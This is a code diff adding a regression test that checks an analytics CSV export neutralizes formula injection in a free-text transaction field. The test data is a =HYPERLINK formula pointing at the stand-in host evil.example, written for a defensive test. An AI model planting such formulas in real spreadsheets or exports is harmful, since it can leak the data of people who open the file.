@@ -296,6 +296,23 @@ test('GET /analytics/export: supports both json and csv formats', async () => {
   }
 });
 
+test('GET /analytics/export: neutralizes a CSV formula-injection payload in a free-text field (regression)', async () => {
+  // `purpose` is free-text and attacker-controlled via POST /transaction. A leading =/+/-/@ makes
+  // Excel/Sheets interpret the cell as a formula on open (e.g. a HYPERLINK() that exfiltrates
+  // data), so the export must neutralize it rather than passing it through verbatim.
+  const { server } = await freshServer();
+  try {
+    await request(server, 'POST', '/transaction', validTransaction({ purpose: '=HYPERLINK("http://evil.example/?x=1","click")' }));
+
+    const csv = await request(server, 'GET', '/analytics/export?format=csv');
+    assert.equal(csv.status, 200);
+    assert.doesNotMatch(String(csv.body), /,=HYPERLINK/, 'a leading = must not reach the CSV cell unescaped');
+    assert.match(String(csv.body), /'=HYPERLINK/, 'expected the standard leading-quote neutralization');
+  } finally {
+    server.close();
+  }
+});
+
 test('GET /analytics/export?format=excel: returns a real .xlsx file (Section 16, Category 18)', async () => {
   const { server } = await freshServer();
   try {
